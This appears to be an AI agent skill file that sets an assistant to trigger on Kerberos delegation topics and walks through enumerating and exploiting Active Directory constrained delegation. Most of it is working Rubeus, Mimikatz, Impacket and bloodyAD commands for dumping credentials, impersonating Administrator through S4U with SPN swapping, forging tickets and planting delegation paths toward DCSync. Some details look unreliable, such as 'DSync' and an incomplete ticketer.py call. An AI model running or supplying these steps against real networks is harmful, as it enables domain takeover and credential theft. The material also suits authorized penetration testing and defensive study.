---
name: active-directory-constrained-delegation
description: How to enumerate and exploit Kerberos Constrained Delegation in Active Directory for privilege escalation. Use this skill whenever the user mentions constrained delegation, S4U2self, S4U2proxy, msDS-AllowedToDelegateTo, TrustedToAuthForDelegation, Kerberos delegation attacks, or any scenario involving service account impersonation in AD environments. Also trigger for Rubeus s4u commands, Impacket getST with altservice, or when investigating delegation-based privilege escalation paths.
---

# Active Directory Constrained Delegation Exploitation

This skill covers enumeration and exploitation of Kerberos Constrained Delegation misconfigurations in Active Directory environments.

## What is Constrained Delegation

Constrained delegation allows a Domain Admin to permit a computer or service account to **impersonate users** against specific services on designated machines. When compromised, this enables:

- **S4U2self**: Service account obtains TGS for itself on behalf of any user
- **S4U2proxy**: Service account obtains TGS on behalf of any user to services listed in `msDS-AllowedToDelegateTo`

**Key insight**: If you compromise the hash of a service account with constrained delegation enabled, you can impersonate users and access services on their behalf — often leading to privilege escalation.

## Critical Limitations

- Users marked as "Account is sensitive and cannot be delegated" **cannot be impersonated**
- SPN swapping weakness: If you have access to one service (e.g., CIFS), you can often access others (e.g., HOST, LDAP) using `/altservice` flag
- **LDAP access on DC** enables DSync attacks

## Cross-Domain Delegation (2025+)

Windows Server 2012+ supports constrained delegation across domains/forests. Modern builds (2016–2025) add PAC SIDs:

- `S-1-18-1` (AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY): Normal authentication
- `S-1-18-2` (SERVICE_ASSERTED_IDENTITY): Protocol transition via S4U2Proxy

## Enumeration

### Using PowerView (Windows)

```powershell
# Find users with constrained delegation enabled
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

# Find computers with constrained delegation enabled
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
```

### Using ADSearch

```bash
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" \
  --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

## Exploitation Workflow

### Step 1: Obtain TGT for the Delegating Service

You need a TGT (or hash) for the service account that has constrained delegation enabled.

**From memory (SYSTEM access):**
```powershell
# Rubeus triage and dump
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# Mimikatz ekeys
mimikatz sekurlsa::ekeys
```

**Request TGT with hash:**
```powershell
# Using RC4 hash
.\Rubeus.exe asktgt /user:SERVICE$ /rc4:HASH /opsec /nowrap

# Using AES256 key
.\Rubeus.exe asktgt /user:SERVICE$ /aes256:KEY /opsec /nowrap
```

> **Important**: You don't need SYSTEM access. TGTs can be obtained via Printer Bug, unconstrained delegation, NTLM relaying, or AD CS abuse.

### Step 2: Execute S4U2self + S4U2proxy

**Quick one-liner (Rubeus):**
```powershell
.\Rubeus.exe s4u /user:SERVICE$ /domain:DOMAIN.local /rc4:HASH \
  /impersonateuser:Administrator \
  /msdsspn:"CIFS/target.domain.local" \
  /altservice:ldap /ptt
```

**Multi-step approach:**
```powershell
# Get TGS for user to self
.\Rubeus.exe s4u /ticket:TGT.kirbi /impersonateuser:Administrator /outfile:TGS_admin

# Get service TGS impersonating user
.\Rubeus.exe s4u /ticket:TGT.kirbi /tgs:TGS_admin \
  /msdsspn:"CIFS/target.domain.local" /outfile:TGS_CIFS

# SPN swap to different service
.\Rubeus.exe s4u /ticket:TGT.kirbi /tgs:TGS_admin \
  /msdsspn:"CIFS/target.domain.local" /altservice:HOST /outfile:TGS_HOST

# Load ticket
.\Rubeus.exe ptt /ticket:TGS_HOST
```

### Step 3: Use the Ticket

```bash
# After PTT, use standard tools
smbclient -k //target.domain.local/C$ -c 'dir'

# Or with Impacket
export KRB5CCNAME=Administrator.ccache
smbclient -k //target.domain.local/C$ -c 'dir'
```

## Linux/Impacket Tooling

### Full S4U Chain with Impacket

```bash
# Get TGT for delegating service
getTGT.py domain.local/websvc$ -hashes :HASH

# S4U2self + S4U2proxy with SPN swap
getST.py -spn CIFS/dc.domain.local -altservice HOST/dc.domain.local \
         -impersonate Administrator domain.local/websvc$ \
         -hashes :HASH -k -dc-ip 10.10.10.5

# Inject ticket
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.domain.local/C$ -c 'dir'
```

### Offline Hash Only (ticketer + getST)

```bash
# Forge user ST first
ticketer.py -nthash:ADMIN_HASH Administrator@domain.local

# Then S4U2proxy
getST.py -spn CIFS/dc.domain.local -impersonate Administrator \
         domain.local/websvc$ -hashes :SERVICE_HASH -k
```

> **Note**: See Impacket issue #1713 for KRB_AP_ERR_MODIFIED quirks when forged ST doesn't match SPN key.

## Automation with bloodyAD

If you have GenericAll/WriteDACL on a computer or service account, you can configure constrained delegation remotely:

```bash
# Enable TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d domain.local -k --host dc.domain.local \
  add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION

# Set delegation target
KRB5CCNAME=owned.ccache bloodyAD -d domain.local -k --host dc.domain.local \
  set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.domain.local'
```

This creates a constrained delegation path for privilege escalation without DA privileges.

## Common Attack Patterns

### Pattern 1: Service Account Compromise
1. Enumerate accounts with `msDS-AllowedToDelegateTo`
2. Obtain hash/TGT of service account
3. Execute S4U2self + S4U2proxy impersonating high-priv user
4. Access delegated services (CIFS, HOST, LDAP)

### Pattern 2: SPN Swapping
1. Get TGS for allowed service (e.g., CIFS)
2. Use `/altservice` to swap to different service (e.g., LDAP, HOST)
3. LDAP on DC enables DSync

### Pattern 3: Cross-Domain
1. Identify cross-domain delegation paths
2. Execute S4U2proxy across domain boundary
3. Look for `SERVICE_ASSERTED_IDENTITY` PAC SID

## Tools Reference

| Tool | Platform | Key Commands |
|------|----------|-------------|
| Rubeus | Windows | `s4u`, `asktgt`, `ptt` |
| Impacket | Linux/Windows | `getST.py`, `getTGT.py`, `ticketer.py` |
| Mimikatz | Windows | `tgt::ask`, `tgs::s4u`, `kerberos::ptt` |
| bloodyAD | Linux | `add uac`, `set object` |
| PowerView | Windows | `Get-DomainUser -TrustedToAuth` |

## References

- [Kerberos Constrained Delegation Overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [ired.team - Kerberos Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [SpecterOps - Kerberosity](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [Impacket Issue #1713](https://github.com/fortra/impacket/issues/1713)
